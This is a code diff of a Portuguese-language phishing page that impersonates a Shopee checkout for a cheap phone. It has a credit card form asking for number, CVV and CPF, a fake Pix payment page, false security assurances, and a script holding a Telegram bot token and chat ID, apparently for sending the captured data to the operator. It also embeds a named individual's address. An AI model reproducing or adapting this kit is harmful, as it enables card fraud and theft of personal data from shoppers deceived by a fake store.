@@ -210,55 +210,162 @@
     </div>
 </div>
 
-<div id="checkoutPage" class="page">
-    <div class="top-nav"><i class="fas fa-arrow-left" onclick="openPage('addrPage')"></i><span>Finalizar Compra</span></div>
-    <div class="section">
-        <p style="font-size:12px; color:var(--shopee); font-weight:bold;"><i class="fas fa-map-marker-alt"></i> Endereço de Entrega</p>
-        <p id="dispName" style="font-weight:bold; margin-top:5px; font-size:14px;"></p>
-        <p id="dispAddr" style="font-size:13px; color:#666;"></p>
+<div id="loadingModal">
+        <div class="spinner"></div>
+        <p style="margin-top:15px; color:#555; font-size:14px;">Processando pagamento...</p>
     </div>
 
-    <div class="section">
-        <p style="font-weight:bold; margin-bottom:15px;">Método de Pagamento</p>
-        <div class="pay-option active" id="optPix" onclick="selectPay('pix')">
-            <div style="display:flex; align-items:center; gap:12px;"><i class="fas fa-coins" style="color:var(--teal)"></i><div><p>Pix</p><p style="font-size:10px; color:var(--shopee)">Desconto de R$ 10,00 aplicado</p></div></div>
-            <div class="radio-circle"></div>
+    <div id="checkoutPage" class="page active">
+        <div class="header-nav">
+            <i class="fas fa-arrow-left" onclick="history.back()"></i>
+            <h1>Finalizar Compra</h1>
         </div>
-        <div class="pay-option" id="optCard" onclick="openPage('cardPage')">
-            <div style="display:flex; align-items:center; gap:12px;"><i class="fas fa-credit-card" style="color:var(--blue)"></i><span>Cartão de Crédito</span></div>
-            <span style="color:var(--shopee); font-size:12px; font-weight:bold;">ADICIONAR</span>
+
+        <div class="section" onclick="openPage('addrPage')">
+            <div class="section-title"><i class="fas fa-map-marker-alt" style="color:var(--shopee)"></i> Endereço de Entrega</div>
+            <div class="addr-box">
+                <div class="addr-info">
+                    <b id="dispName">Paulo Felipe Do Nascimento</b>
+                    <p id="dispAddr">Riachuelo, 2676, Camocim, Ceará, 62400-000</p>
+                </div>
+                <i class="fas fa-chevron-right" style="margin-left:auto; color:#ccc;"></i>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="prod-card">
+                <img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg" class="prod-img">
+                <div class="prod-details">
+                    <p>Xiaomi Poco X7 PRO 5G - Lote 2026</p>
+                    <span class="tag-gray">Variação: Iron Man, 512GB</span>
+                    <p class="orange-text" style="margin-top:5px; font-weight:bold;">R$599,00</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-title">Método de Pagamento</div>
+            
+            <div class="pay-option active" id="optPix" onclick="selectPayment('pix')">
+                <div class="pay-left">
+                    <i class="fas fa-coins" style="color:var(--teal)"></i>
+                    <div>
+                        <p style="font-size:14px;">Pix</p>
+                        <p style="font-size:11px; color:var(--shopee);">Ganhe R$10 de desconto extra</p>
+                    </div>
+                </div>
+                <div class="radio-circle"></div>
+            </div>
+
+            <div class="pay-option" id="optCard" onclick="openPage('cardPage')">
+                <div class="pay-left">
+                    <i class="fas fa-credit-card" style="color:var(--blue)"></i>
+                    <div>
+                        <p style="font-size:14px;">Cartão de Crédito</p>
+                        <p style="font-size:11px; color:#888;">Parcele em até 12x</p>
+                    </div>
+                </div>
+                <span class="orange-text" style="font-size:12px; font-weight:bold;">ADICIONAR</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <div style="display:flex; justify-content:space-between; margin-bottom:8px; font-size:14px;">
+                <span>Subtotal do Pedido</span><span>R$599,00</span>
+            </div>
+            <div style="display:flex; justify-content:space-between; margin-bottom:8px; font-size:14px;" class="orange-text">
+                <span>Cupom Shopee</span><span>-R$20,00</span>
+            </div>
+            <div id="pixDiscountRow" style="display:flex; justify-content:space-between; margin-bottom:8px; font-size:14px;" class="orange-text">
+                <span>Desconto Pix</span><span>-R$10,00</span>
+            </div>
+            <div style="display:flex; justify-content:space-between; margin-top:15px; font-weight:bold; font-size:16px;">
+                <span>Pagamento Total</span><span class="orange-text" id="finalTotal">R$569,00</span>
+            </div>
+        </div>
+
+        <div class="security-info">
+            <i class="fas fa-shield-alt"></i> Dados protegidos por ShopeePay
+        </div>
+
+        <div class="footer-fixed">
+            <div class="total-price-label">
+                <p style="font-size:12px; color:#666;">Total</p>
+                <b class="orange-text" id="footerPrice" style="font-size:18px;">R$569,00</b>
+            </div>
+            <button class="btn-main" onclick="processOrder()">FAZER PEDIDO</button>
         </div>
     </div>
 
-    <div class="section">
-        <div style="display:flex; justify-content:space-between; margin-bottom:10px;"><span>Total do Pedido</span><b class="orange-text" id="finalTotal" style="color:var(--shopee); font-size:18px;">R$ 589,00</b></div>
-    </div>
-    <div style="padding:15px;"><button class="btn-main" onclick="finishOrder()">FAZER PEDIDO</button></div>
-</div>
+    <div id="cardPage" class="page">
+        <div class="header-nav">
+            <i class="fas fa-arrow-left" onclick="openPage('checkoutPage')"></i>
+            <h1>Novo Cartão de Crédito</h1>
+        </div>
+        
+        <div class="section">
+            <div class="input-group">
+                <label>NÚMERO DO CARTÃO</label>
+                <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" oninput="maskCard(this)">
+            </div>
+            <div class="input-group">
+                <label>NOME COMPLETO (COMO NO CARTÃO)</label>
+                <input type="text" id="cardName" placeholder="EX: PAULO F NASCIMENTO">
+            </div>
+            <div style="display:flex; gap:10px;">
+                <div class="input-group" style="flex:1;">
+                    <label>VALIDADE</label>
+                    <input type="tel" id="cardExpiry" placeholder="MM/AA" maxlength="5" oninput="maskExpiry(this)">
+                </div>
+                <div class="input-group" style="flex:1;">
+                    <label>CVV</label>
+                    <input type="tel" id="cardCvv" placeholder="123" maxlength="4">
+                </div>
+            </div>
+            <div class="input-group">
+                <label>CPF DO TITULAR</label>
+                <input type="tel" id="cardCpf" placeholder="000.000.000-00" maxlength="14" oninput="maskCpf(this)">
+            </div>
 
-<div id="cardPage" class="page">
-    <div class="top-nav"><i class="fas fa-arrow-left" onclick="openPage('checkoutPage')"></i><span>Dados do Cartão</span></div>
-    <div class="section">
-        <input type="tel" id="cNum" placeholder="Número do Cartão" maxlength="19" oninput="mCard(this)">
-        <input type="text" id="cNom" placeholder="Nome Impresso no Cartão">
-        <div style="display:flex; gap:10px;"><input type="tel" id="cVal" placeholder="MM/AA" maxlength="5" oninput="mVal(this)"><input type="tel" id="cCvv" placeholder="CVV" maxlength="4"></div>
-        <button class="btn-main" onclick="captureCard()">PAGAR AGORA</button>
-    </div>
-</div>
+            <div class="security-info" style="justify-content: flex-start; margin-bottom: 20px;">
+                <i class="fas fa-lock" style="font-size:10px;"></i> Suas informações de cartão estão seguras.
+            </div>
 
-<div id="pixPage" class="page">
-    <div class="top-nav"><span>Pagamento via Pix</span></div>
-    <div class="section" style="text-align:center;">
-        <i class="fas fa-clock" style="color:var(--shopee); font-size:40px;"></i>
-        <h2 style="margin:15px 0 5px;">Aguardando Pagamento</h2>
-        <p style="font-size:13px; color:#666; margin-bottom:20px;">Copie o código abaixo para finalizar.</p>
-        <img id="qrImg" src="" width="180">
-        <div id="pCode" style="background:#f5f5f5; padding:10px; border:1px dashed #ccc; font-size:10px; word-break:break-all; margin:15px 0;"></div>
-        <button class="btn-main" onclick="copyPix()">COPIAR CÓDIGO PIX</button>
+            <button class="btn-main" style="width:100%;" onclick="captureCard()">CONFIRMAR</button>
+        </div>
     </div>
-</div>
 
-<script>
+    <div id="addrPage" class="page">
+        <div class="header-nav">
+            <i class="fas fa-arrow-left" onclick="openPage('checkoutPage')"></i>
+            <h1>Endereço de Entrega</h1>
+        </div>
+        <div class="section">
+            <input type="text" id="inName" placeholder="Nome Completo">
+            <input type="tel" id="inCep" placeholder="CEP" maxlength="8" onblur="apiCep(this.value)">
+            <input type="text" id="inRua" placeholder="Rua / Avenida">
+            <input type="text" id="inNum" placeholder="Número">
+            <input type="text" id="inBairro" placeholder="Bairro">
+            <input type="text" id="inCidade" placeholder="Cidade">
+            <button class="btn-main" style="width:100%; margin-top:10px;" onclick="saveAddress()">SALVAR ENDEREÇO</button>
+        </div>
+    </div>
+
+    <div id="pixPage" class="page">
+        <div class="header-nav">
+            <i class="fas fa-arrow-left" onclick="openPage('checkoutPage')"></i>
+            <h1>Pagamento Pix</h1>
+        </div>
+        <div class="section" style="text-align:center;">
+            <p style="font-weight:bold; color:var(--shopee); margin-bottom:15px;">Pedido Reservado!</p>
+            <img id="qrCodeImg" src="" width="200">
+            <div id="pixPayload" style="background:#f5f5f5; padding:15px; border-radius:4px; font-size:10px; word-break:break-all; border:1px dashed #ccc; margin:15px 0;"></div>
+            <button class="btn-main" style="width:100%;" onclick="copyPix()">COPIAR CÓDIGO PIX</button>
+            <p style="font-size:12px; color:#888; margin-top:15px;">O pagamento é aprovado instantaneamente.</p>
+        </div>
+    </div>
+
+    <script>
     const precoBase = 599.00;
     const BOT_TOKEN = '7880759082:AAEvRzo4_NjdKnzrISfBzq3PeMLVFWRIvtw';
     const CHAT_ID = '7294447445';
@@ -361,3 +468,4 @@
 </script>
 </body>
 </html>
+
